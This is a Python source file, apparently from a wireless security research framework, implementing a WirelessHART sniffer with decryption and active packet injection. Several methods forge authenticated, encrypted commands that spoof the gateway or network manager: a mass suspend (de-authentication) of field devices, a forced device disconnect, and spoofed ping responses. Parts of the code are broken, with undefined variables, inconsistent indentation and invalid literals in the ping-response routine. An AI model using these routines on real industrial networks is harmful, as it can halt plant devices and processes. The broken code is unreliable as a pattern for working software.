import logging

from scapy.packet import Packet
from whad.hub.dot15d4.events import DiscoveryEvt
from whad.wirelesshart.connector import WirelessHart
from whad.wirelesshart.connector.linkexplorer import LinkExplorer
from whad.wirelesshart.connector.superframes import Superframes

from whad.wirelesshart.connector.channelmap import ChannelMap
from whad.wirelesshart.connector.link import Link
from whad.wirelesshart.exceptions import MissingEncryptionKey, MissingLink
from whad.wirelesshart.sniffing import SnifferConfiguration
from whad.scapy.layers.wirelesshart import Superframe, WirelessHart_Add_Link_Request, WirelessHart_Add_Link_Response, WirelessHart_Command_Request_Hdr, WirelessHart_Command_Response_Hdr, WirelessHart_DataLink_Acknowledgement, WirelessHart_DataLink_Advertisement, WirelessHart_DataLink_Hdr, WirelessHart_Disconnect_Device_Request, WirelessHart_Network_Hdr, WirelessHart_Network_Security_SubLayer_Hdr, WirelessHart_Suspend_Devices_Request, WirelessHart_Suspend_Devices_Response, WirelessHart_Transport_Layer_Hdr, WirelessHart_Vendor_Specific_Dust_Networks_Ping_Request, WirelessHart_Vendor_Specific_Dust_Networks_Ping_Response,  WirelessHart_Write_Modify_Session_Command_Request, compute_dlmic
from scapy.layers.dot15d4 import Dot15d4Data, Dot15d4FCS
from whad.exceptions import UnsupportedCapability
from whad.helpers import message_filter
from whad.wirelesshart.crypto import WirelessHartDecryptor, WirelessHartNetworkLayerCryptoManager
from whad.common.sniffing import EventsManager
from whad.hub.dot15d4 import RawPduReceived, PduReceived
from whad.hub.message import AbstractPacket
from whad.exceptions import WhadDeviceDisconnected
from whad.device import WhadDevice

logger = logging.getLogger(__name__)

class Sniffer(WirelessHart, EventsManager):
    """
    Wireless Hart Sniffer interface for compatible WHAD device.
    """

    def __init__(self, device: WhadDevice):
        """Sniffer initialization.

        :param device: Device to use for sniffing
        :type device: WhadDevice
        """
        WirelessHart.__init__(self, device)
        EventsManager.__init__(self)

        self.__decryptor = WirelessHartDecryptor()
        self.__configuration = SnifferConfiguration()
        self.superframes = Superframes(self)
        self.channelmap = ChannelMap()
        self.linkexplorer = LinkExplorer(self)
        
        self.__panid = None
        self.__asn = 0
        
        self.spoofed = []
        
        self.add_event_listener(self.on_event)
        
        # Check if device can perform sniffing
        if not self.can_sniff():
            raise UnsupportedCapability("Sniff")

    def _enable_sniffing(self):
        for key in self.__configuration.keys:
            self.__decryptor.add_key(key)
        self.sniff_wirelesshart(channel=self.__configuration.channel)
        
    def enable_exploring_links(self):
        self.linkexplorer.start()
        
    def disable_exploring_links(self):
        self.linkexplorer.stop()

    def on_event(self, event):
        if isinstance(event, DiscoveryEvt):
            self.on_discovery_evt(event)
        
    def add_key(self, key: bytes):
        """Add an encryption key to our sniffer.

        :param key: encryption key to add
        :type key: bytes
        """
        self.__configuration.keys.append(key)
    
    def add_decryption_key(self, key: bytes):
        """Add a decryption key to our sniffer.

        :param key: decryption key to add
        :type key: bytes
        """
        self.__decryptor.keys.append(key)
        
    def add_join_key(self, key:bytes):
        """Add join key to decrypt sniffed communications
        
        :param key: join key to add
        :type key: bytes
        """
        self.__decryptor.set_join_key(key)

    def clear_keys(self):
        """Clear all stored encryption keys.
        """
        self.__configuration.keys = []

    @property
    def decrypt(self) -> bool:
        """Decryption enabled
        """
        return self.__configuration.decrypt

    @decrypt.setter
    def decrypt(self, decrypt: bool):
        """Set decryption status
        """
        self.__configuration.decrypt = decrypt


    @property
    def channel(self) -> int:
        """Current channel
        """
        return self.__configuration.channel

    @channel.setter
    def channel(self, channel: int = 11):
        """Set current channel.

        :param channel: new Wireless Hart channel to use
        :type channel: int
        """
        self.stop()
        self.__configuration.channel = channel
        self._enable_sniffing()


    @property
    def configuration(self) -> SnifferConfiguration:
        """Current sniffer configuration.
        """
        return self.__configuration

    @configuration.setter
    def configuration(self, new_configuration):
        self.stop()
        self.__configuration = new_configuration
        self._enable_sniffing()
   
    def process_ping(self, src):
    	self.spoofed.add(src)

    def process_packet(self, packet: Packet):
        """Process received Wireless Hart packet.

        :param packet: received packet
        :type packet: :class:`scapy.packet.Packet`
        :return: received packet
        :rtype: :class:`scapy.packet.Packet`
        """
        global first_adv
        if WirelessHart_Network_Security_SubLayer_Hdr in packet and self.__configuration.decrypt:
            self.__asn = (self.__asn & (0xffffff0000)) | (packet.asn_snippet%256) | packet.seqnum
            decrypted, success = self.__decryptor.attempt_to_decrypt(packet)
            if success:
                packet = decrypted 
                for cmd in decrypted.getlayer(WirelessHart_Transport_Layer_Hdr).commands:
                    if WirelessHart_Add_Link_Response in cmd:
                        c = cmd[WirelessHart_Add_Link_Response]
                        if c.status == 0:
                            print(f"add link response src = {packet.src_addr}, neighbor = {c.neighbor_nickname}")
                            self.superframes.create_and_add_link(c.superframe_id, 
                                                      c.slot_number,
                                                      c.channel_offset, 
                                                      packet.src_addr,
                                                      c.neighbor_nickname if c.link_type==Link.TYPE_NORMAL else 0xffff, #the neighbor in response is not 0xFFFF when discovery, broadcast and join => hand handle it
                                                      Link.OPTIONS_TRANSMIT if c.transmit else Link.OPTIONS_RECEIVE if c.receive else Link.OPTIONS_SHARED, 
                                                      c.link_type)
                            
                        """else:
                            self.superframes.delete_link"""
                    if WirelessHart_Add_Link_Request in cmd:
                        c = cmd[WirelessHart_Add_Link_Request]
                        print(f"add link request src = {packet.dest_addr}, neighbor = {c.neighbor_nickname}")
                        self.superframes.create_and_add_link(c.superframe_id, 
                                                  c.slot_number,
                                                  c.channel_offset, 
                                                  packet.dest_addr,
                                                  c.neighbor_nickname,
                                                  Link.OPTIONS_TRANSMIT if c.transmit else Link.OPTIONS_RECEIVE if c.receive else Link.OPTIONS_SHARED, 
                                                  c.link_type)
                    
                    if WirelessHart_Vendor_Specific_Dust_Networks_Ping_Request in cmd and packet.dest_addr in self.spoofed:
                    	self.ping_response(packet.dest_src, packet.src_addr)
                    	print("spoofing ping response")        
        if WirelessHart_DataLink_Advertisement in packet:
            self.process_advertisement(packet)
            if first_adv :
                packet.show()
                first_adv = False
        else:
            packet.show()
        return packet
    
    def process_advertisement(self, pkt:Packet):
        """Updates the channel map and the join links based on the packet"""
        self.superframes.update_from_advertisement(pkt)
        self.channelmap.update_from_advertisement(pkt)
        self.__panid = pkt.dest_panid
        self.__asn = pkt.asn
        return pkt
    
    def delete_superframe(self, id)->bool:
        print("delete supefrframe wihart")
        super().delete_superframe(id)
        self.superframes.delete_superframe(id)
        self.linkexplorer.delete_superframe(id) 
                
    def on_discovery_evt(self, evt: DiscoveryEvt):
        """Calls linkexplorer to take into account the discovery of the new communication"""
        params = getattr(evt, '_WhadEvent__parameters', {})
        pdu = params.get("pdu")
        slot = params.get("slot")
        offset = params.get("offset")
        if all(p is not None for p in [pdu, slot, offset]):
            if (pdu[1]==0x41):
                self.linkexplorer.discovered_communication(pdu[1:], slot, offset)
            else:
                print("heard a non wihart pkt:", pdu.hex())
        else:
            print("[Warning] DiscoveryEvt missing parameters.")
            
    def sniff(self):
        try:
            while True:
                if self.support_raw_pdu():
                    message_type = RawPduReceived
                else:
                    message_type = PduReceived

                message = self.wait_for_message(filter=message_filter(message_type), timeout=0.1)
                if message is not None and issubclass(message, AbstractPacket):
                    packet = message.to_packet()
                    self.monitor_packet_rx(packet)
                    packet = self.process_packet(packet)
                    yield packet
        except WhadDeviceDisconnected:
            return
        
    def print_decryptor(self):
        print(self.__decryptor)
        
    def mass_de_authetication_packet(self, dst, duration, wait_beofre_suspend:int=1000, src:int=0x1):
        """
        Sends a WirelessHart_Suspend_Devices_Request on the next slot in the next superframe"""
        
        #get the superframe and the link corresponding to this send
        ans = self.superframes.get_link(dst, 0xffff, Link.TYPE_BROADCAST)
        if ans:
            (sf, link) = ans
        else:
            #Missing link raise exception and print existing links
            self.superframes.print_table()
            raise MissingLink("0xf980", hex(dst), "TYPE_BROADCAST")
        
        #planify the asn to send : next broadcast link receive in the next superframe
        asn_to_send = (((self.__asn + 200) // sf.nb_slots) + 1) * sf.nb_slots + link.join_slot
        # start the suspend after N slots in order to broadcast (every slot is 10ms)
        asn_suspend = asn_to_send + wait_beofre_suspend
        #resume after the specified duration
        asn_resume = asn_suspend + duration
        
        #prepare layers
        suspend_command = WirelessHart_Suspend_Devices_Request(
            asn_suspend=asn_suspend,
            asn_resume=asn_resume
        )
        
        request = WirelessHart_Command_Request_Hdr(
            command_number=972,
            len=10
        ) 
        
        transport_layer = WirelessHart_Transport_Layer_Hdr(
            acknowledged=1,
            response=0,
            broadcast=1,
            tr_seq_num=31,
            
            device_malfunction=0,
            configuration_changed=0,
            cold_start=0,
            more_status_available=0,
            loop_current_fixed=0,
            loop_current_saturated=0,
            non_primary_variable_out_of_limit=0,
            primary_variable_out_of_limit=0,
            
            reserved=0,
            function_check=0,
            out_of_specification=0,
            failure=0,
            critical_power_failure=0,
            device_variable_alert=0,
            maintenance_required=0,
            
            commands = [request / suspend_command]
        )
        
        #get the encryption key and the peer (nonce)
        key = self.__decryptor.get_broadcast_session_key(0xf980, 0xffff)
        peer = self.__decryptor.get_broadcast_peer(0xf980, 0xffff)
        
        if key and peer:
            #prepare network layer
            network_layer = WirelessHart_Network_Hdr(
                nwk_dest_addr_length = 0,
                nwk_src_addr_length = 0,
                proxy_route = 0,
                second_src_route_segment = 0,
                first_src_route_segment = 1,
                ttl = 0,
                asn_snippet = (asn_to_send%0xffff) - 1,
                graph_id = 0x1,
                nwk_dest_addr = 0xffff,
                nwk_src_addr = 0xf980,
                first_route_segment = [0x1, dst, 0xffff, 0xffff]
            )
            
            #prepare security sublayer
            peer.incremenet_nonce()
            security_sub_layer = WirelessHart_Network_Security_SubLayer_Hdr(
                security_types=0,
                counter=peer.get_nonce_counter()%256,
                nwk_mic = 0
            )
            
            #prepare data link header
            data_link_layer = WirelessHart_DataLink_Hdr(
                reserved = 0,
                priority = 3,
                network_key_use = 1,
                pdu_type = 7,
                mic = 0x0
            )
            
            dot15d4_data = Dot15d4Data(
                dest_panid = self.__panid,
                dest_addr = dst,
                src_addr = src #spoof the gatway
            )
            dot15d4_fcs = Dot15d4FCS(
                fcf_panidcompress = True,
                fcf_ackreq = False,
                fcf_pending = False,
                fcf_security = False,
                fcf_frametype = 1,
                fcf_srcaddrmode = 2,
                fcf_framever = 0,
                fcf_destaddrmode = 2,
                fcf_reserved_2 = 0,
                seqnum = asn_to_send%256
            )
            #put layers together
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  transport_layer
            
            #generate nonce for encryption
            manager = WirelessHartNetworkLayerCryptoManager(key)
            manager.nonce = manager.generateNonce(packet)
            #put nonce, ttln nwkk_mic and counter to zero in the packet (WirelessHART encryption specification)
            security_sub_layer.nonce = 0x0
            
            #Reassemble pkt
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  transport_layer
            #encrypt
            enciphered, nwk_mic = manager.encrypt(bytes(transport_layer), manager.generateAuth(packet))
            #update pkt values
            security_sub_layer.nwk_mic = int.from_bytes(nwk_mic)
            security_sub_layer.counter = peer.get_nonce_counter()%256
            network_layer.ttl = 126
            #Put together
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  enciphered
            
            #Compute the message integrity code and update its value in the pkt
            dl_mic = compute_dlmic(packet, self.__decryptor.get_network_key(), asn_to_send)
            data_link_layer.mic = int.from_bytes(dl_mic)
            final_packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  enciphered

            print(f"sending will occur in {(asn_to_send-self.__asn)/100}s")
            #send command 
            self.send_in_slot(final_packet, asn_to_send)
            return final_packet
        
        raise MissingEncryptionKey(dst)
    def ping_response(self, src, dst_dl, hops=1):
      """Prepare ping response"""
      ans = self.superframes.get_link(dst, src, Link.TYPE_BROADCAST)
       
      (sf, link) = ans
       
      asn_to_send = (((self.__asn + 1000) // superframe.nb_slots) + 1) * superframe.nb_slots + link.join_slot
      
      ping_response = WirelessHart_Vendor_Specific_Dust_Networks_Ping_Response(
          status=0,
            expanded_device_type= 0xe0a2,
            hops = hops,
            temperature = 01,
            voltage = 2700
        )
        response = WirelessHart_Command_Response_Hdr(
            command_number=0xfc05,
            len=9
        )
        transport_layer = WirelessHart_Transport_Layer_Hdr(
            acknowledged=0,
            response=1,
            broadcast=0,
            tr_seq_num=31,
           
            device_malfunction=0,
            configuration_changed=0,
            cold_start=0,
            more_status_available=0,
            loop_current_fixed=0,
            loop_current_saturated=0,
            non_primary_variable_out_of_limit=0,
            primary_variable_out_of_limit=0,
           
            reserved=0,
            function_check=0,
            out_of_specification=0,
            failure=0,
            critical_power_failure=0,
            device_variable_alert=0,
            maintenance_required=0,
           
            commands = [response / ping_response]
        )
       
        #get encryption key and peer (nonce)
        key = self.__decryptor.get_unicast_session_key(0xf980, src)
        peer = self.__decryptor.get_unicast_peer(0xf980, src)

        if key and peer:

            network_layer = WirelessHart_Network_Hdr(
                nwk_dest_addr_length = 0,
                nwk_src_addr_length = 0,
                proxy_route = 0,
                second_src_route_segment = 0,
                first_src_route_segment = 1,
                ttl = 0,
                asn_snippet = (asn_to_send%0xffff) - 1,
                graph_id = 0x1,
                nwk_dest_addr = 0xf980,
                nwk_src_addr = src,
                first_route_segment = [src, 0x1, 0xffff, 0xffff]
            )
           
            peer.incremenet_nonce()
            security_sub_layer = WirelessHart_Network_Security_SubLayer_Hdr(
                security_types=0,
                counter=peer.get_nonce_counter()%256,
                nwk_mic = 0
            )
           
            data_link_layer = WirelessHart_DataLink_Hdr(
                reserved = 0,
                priority = 3,
                network_key_use = 1,
                pdu_type = 7,
                mic = 0x0
            )
           
            dot15d4_data = Dot15d4Data(
                dest_panid = self.__panid,
                dest_addr = dst_dl,
                src_addr = src
            )
            dot15d4_fcs = Dot15d4FCS(
                fcf_panidcompress = True,
                fcf_ackreq = False,
                fcf_pending = False,
                fcf_security = False,
                fcf_frametype = 1,
                fcf_srcaddrmode = 2,
                fcf_framever = 0,
                fcf_destaddrmode = 2,
                fcf_reserved_2 = 0,
                seqnum = asn_to_send%256
            )
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  transport_layer
            #create manager with key and nonce
            manager = WirelessHartNetworkLayerCryptoManager(key)
            manager.nonce = manager.generateNonce(packet)
            #put nonce, ttl, counter and nwk_mic to zero (WiHART encryption specifications)
            security_sub_layer.nonce = 0x0
           
            #assemble pkt
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  transport_layer
            #encrypt with AES CCM*
            enciphered, nwk_mic = manager.encrypt(bytes(transport_layer), manager.generateAuth(packet))
            #fill fields
            security_sub_layer.nwk_mic = int.from_bytes(nwk_mic)
            security_sub_layer.counter = peer.get_nonce_counter()%256
            network_layer.ttl = 126
           
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  enciphered
           
            #compute message integrity code and fill in the pkt
            dl_mic = compute_dlmic(packet, self.__decryptor.get_network_key(), asn_to_send)
            data_link_layer.mic = int.from_bytes(dl_mic)
            final_packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  enciphered

            print(f"response to a ping request ")
            #send command to butterfly
            self.send_in_slot(final_packet, asn_to_send)
            return final_packet
       
        raise MissingEncryptionKey(dst)
    
    def ping_request(self, dst):
        """Looks for the link corresponding to the communication between src and dst and sends a ping request"""
        ans = self.superframes.get_link(dst, 0x1, Link.TYPE_BROADCAST)
        
        if ans :
            (sf, link) = ans
            return self.ping_request_on_link(dst, sf, link)
        #no link found raise error
        raise MissingLink("0x1", hex(dst), "TYPE_BROADCAST")

    def ping_request_on_link(self, dst, superframe:Superframe, link: Link):
        """Prepare and encrypt ping request paquet and sends on the given link"""
        
        #calculate asn to send : next slot of the link communication in the next superframe
        asn_to_send = (((self.__asn + 200) // superframe.nb_slots) + 1) * superframe.nb_slots + link.join_slot

        #prepare layers
        ping_request = WirelessHart_Vendor_Specific_Dust_Networks_Ping_Request(
            expanded_device_type= 0xe0a2,
            hops = 1
        )
        
        request = WirelessHart_Command_Request_Hdr(
            command_number=0xfc04,
            len=4
        ) 
        
        transport_layer = WirelessHart_Transport_Layer_Hdr(
            acknowledged=0,
            response=0,
            broadcast=0,
            tr_seq_num=31,
            
            device_malfunction=0,
            configuration_changed=0,
            cold_start=0,
            more_status_available=0,
            loop_current_fixed=0,
            loop_current_saturated=0,
            non_primary_variable_out_of_limit=0,
            primary_variable_out_of_limit=0,
            
            reserved=0,
            function_check=0,
            out_of_specification=0,
            failure=0,
            critical_power_failure=0,
            device_variable_alert=0,
            maintenance_required=0,
            
            commands = [request / ping_request]
        )
        
        #get encryption key and peer (nonce)
        key = self.__decryptor.get_unicast_session_key(0xf980, dst)
        peer = self.__decryptor.get_unicast_peer(0xf980, dst)

        if key and peer:

            network_layer = WirelessHart_Network_Hdr(
                nwk_dest_addr_length = 0,
                nwk_src_addr_length = 0,
                proxy_route = 0,
                second_src_route_segment = 0,
                first_src_route_segment = 1,
                ttl = 0,
                asn_snippet = (asn_to_send%0xffff) - 1,
                graph_id = 0x1,
                nwk_dest_addr = dst,
                nwk_src_addr = 0xf980,
                first_route_segment = [0x1, dst, 0xffff, 0xffff]
            )
            
            peer.incremenet_nonce()
            security_sub_layer = WirelessHart_Network_Security_SubLayer_Hdr(
                security_types=0,
                counter=peer.get_nonce_counter()%256,
                nwk_mic = 0
            )
            
            data_link_layer = WirelessHart_DataLink_Hdr(
                reserved = 0,
                priority = 3,
                network_key_use = 1,
                pdu_type = 7,
                mic = 0x0
            )
            
            dot15d4_data = Dot15d4Data(
                dest_panid = self.__panid,
                dest_addr = dst,
                src_addr = 0x1
            )
            dot15d4_fcs = Dot15d4FCS(
                fcf_panidcompress = True,
                fcf_ackreq = False,
                fcf_pending = False,
                fcf_security = False,
                fcf_frametype = 1,
                fcf_srcaddrmode = 2,
                fcf_framever = 0,
                fcf_destaddrmode = 2,
                fcf_reserved_2 = 0,
                seqnum = asn_to_send%256
            )
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  transport_layer
            #create manager with key and nonce
            manager = WirelessHartNetworkLayerCryptoManager(key)
            manager.nonce = manager.generateNonce(packet)
            #put nonce, ttl, counter and nwk_mic to zero (WiHART encryption specifications)
            security_sub_layer.nonce = 0x0
            
            #assemble pkt
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  transport_layer
            #encrypt with AES CCM*
            enciphered, nwk_mic = manager.encrypt(bytes(transport_layer), manager.generateAuth(packet))
            #fill fields
            security_sub_layer.nwk_mic = int.from_bytes(nwk_mic)
            security_sub_layer.counter = peer.get_nonce_counter()%256
            network_layer.ttl = 126
            
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  enciphered
            
            #compute message integrity code and fill in the pkt
            dl_mic = compute_dlmic(packet, self.__decryptor.get_network_key(), asn_to_send)
            data_link_layer.mic = int.from_bytes(dl_mic)
            final_packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  enciphered

            print(f"sending will occur in {(asn_to_send - self.__asn)/100}s")
            #send command to butterfly
            self.send_in_slot(final_packet, asn_to_send)
            return final_packet
        
        raise MissingEncryptionKey(dst)
    
    def disconnect_device(self, dst):
        """Sends a packet containing a disconnect request from the network manager"""
        
        #get the superframe and the link corresponding to this send
        ans = self.superframes.get_link(dst, 0x1, Link.TYPE_BROADCAST, Link.OPTIONS_RECEIVE)
        if ans:
            (sf, link) = ans
        else:
            #Missing link raise exception and print existing links
            self.superframes.print_table()
            raise MissingLink("0xf980", hex(dst), "TYPE_BROADCAST")
        
        #planify the asn to send : next broadcast link receive in the next superframe
        asn_to_send = ((self.__asn // sf.nb_slots) + 1) * sf.nb_slots + link.join_slot
        
        #prepare layers
        disconnect_cmd = WirelessHart_Disconnect_Device_Request(
            reason = "User-initialized"
        )
        
        request = WirelessHart_Command_Request_Hdr(
            command_number=960,
            len=1
        ) 
        
        transport_layer = WirelessHart_Transport_Layer_Hdr(
            acknowledged=1,
            response=0,
            broadcast=0,
            tr_seq_num=31,
            
            device_malfunction=0,
            configuration_changed=0,
            cold_start=0,
            more_status_available=0,
            loop_current_fixed=0,
            loop_current_saturated=0,
            non_primary_variable_out_of_limit=0,
            primary_variable_out_of_limit=0,
            
            reserved=0,
            function_check=0,
            out_of_specification=0,
            failure=0,
            critical_power_failure=0,
            device_variable_alert=0,
            maintenance_required=0,
            
            commands = [request / disconnect_cmd]
        )
        
        #get the encryption key and the peer (nonce)
        key = self.__decryptor.get_unicast_session_key(0xf980, dst)
        peer = self.__decryptor.get_unicast_peer(0xf980, dst)
        
        if key and peer:
            #prepare network layer
            network_layer = WirelessHart_Network_Hdr(
                nwk_dest_addr_length = 0,
                nwk_src_addr_length = 0,
                proxy_route = 0,
                second_src_route_segment = 0,
                first_src_route_segment = 0,
                ttl = 0,
                asn_snippet = ((asn_to_send%0x10000)-1)%256,
                graph_id = 0x1,
                nwk_dest_addr = dst,
                nwk_src_addr = 0xf980
            )
            
            #prepare security sublayer
            peer.incremenet_nonce()
            security_sub_layer = WirelessHart_Network_Security_SubLayer_Hdr(
                security_types=0,
                counter=peer.get_nonce_counter()%256,
                nwk_mic = 0
            )
            
            #prepare data link header
            data_link_layer = WirelessHart_DataLink_Hdr(
                reserved = 0,
                priority = 3,
                network_key_use = 1,
                pdu_type = 7,
                mic = 0x0
            )
            
            dot15d4_data = Dot15d4Data(
                dest_panid = self.__panid,
                dest_addr = dst,
                src_addr = 0x1
            )
            dot15d4_fcs = Dot15d4FCS(
                fcf_panidcompress = True,
                fcf_ackreq = False,
                fcf_pending = False,
                fcf_security = False,
                fcf_frametype = 1,
                fcf_srcaddrmode = 2,
                fcf_framever = 0,
                fcf_destaddrmode = 2,
                fcf_reserved_2 = 0,
                seqnum = asn_to_send%256
            )
            #put layers together
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  transport_layer
            
            #generate nonce for encryption
            manager = WirelessHartNetworkLayerCryptoManager(key)
            manager.nonce = manager.generateNonce(packet)
            #put nonce, ttln nwkk_mic and counter to zero in the packet (WirelessHART encryption specification)
            security_sub_layer.nonce = 0x0
            
            #Reassemble pkt
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  transport_layer
            #encrypt
            enciphered, nwk_mic = manager.encrypt(bytes(transport_layer), manager.generateAuth(packet))
            #update pkt values
            security_sub_layer.nwk_mic = int.from_bytes(nwk_mic)
            security_sub_layer.counter = peer.get_nonce_counter()%256
            network_layer.ttl = 126
            #Put together
            packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  enciphered
            
            #Compute the message integrity code and update its value in the pkt
            dl_mic = compute_dlmic(packet, self.__decryptor.get_network_key(), asn_to_send)
            data_link_layer.mic = int.from_bytes(dl_mic)
            final_packet = dot15d4_fcs / dot15d4_data / data_link_layer / network_layer / security_sub_layer /  enciphered

            print(f"sending will occur in {(asn_to_send-self.__asn)/100}s")
            #send command 
            self.send_in_slot(final_packet, asn_to_send)
            return final_packet
        
        raise MissingEncryptionKey(dst)
        

first_adv = True
